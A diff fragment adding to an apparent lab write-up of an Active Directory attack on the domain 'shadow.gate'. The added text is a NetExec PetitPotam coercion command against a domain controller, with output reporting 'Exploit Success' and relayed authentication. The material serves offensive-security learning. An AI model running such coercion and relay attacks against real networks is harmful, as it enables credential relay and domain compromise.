@@ -323,5 +323,14 @@ Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 Ill start by setting the relay this is where i will receive the authentication and this will forward the authentication to the vulnerable HTTP endpoint which should return a certificate!
 
 ```python
+nxc smb dc01.shadow.gate -d shadow.gate -u bbrown -p '12345678' -M coerce_plus -o METHOD=PetitPotam LISTENER=10.200.55.70
+SMB         10.1.130.196    445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:shadow.gate) (signing:False) (SMBv1:None)
+SMB         10.1.130.196    445    DC01             [+] shadow.gate\bbrown:12345678 
+COERCE_PLUS 10.1.130.196    445    DC01             VULNERABLE, PetitPotam
+COERCE_PLUS 10.1.130.196    445    DC01             Exploit Success, efsrpc\EfsRpcAddUsersToFile
+```
+This has relayed authentication back to me!
+
+```python
 
 ```
